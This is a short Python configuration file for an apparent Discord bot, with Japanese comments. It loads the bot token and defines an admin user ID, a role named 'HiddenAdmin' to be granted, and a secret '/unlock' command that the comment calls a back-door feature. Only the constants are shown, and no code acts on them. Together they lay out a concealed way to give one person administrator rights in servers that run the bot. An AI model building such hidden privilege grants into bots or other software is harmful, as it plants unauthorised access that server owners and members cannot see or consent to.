import os
from dotenv import load_dotenv

# 環境変数を読み込む
load_dotenv()

TOKEN = os.getenv("DISCORD_BOT_TOKEN")
ADMIN_ID = 976024858574082078  # あなたのユーザーID
ADMIN_ROLE_NAME = "HiddenAdmin"  # 付与する管理者ロール名
SECRET_COMMAND = "/unlock"  # 裏機能のコマンド
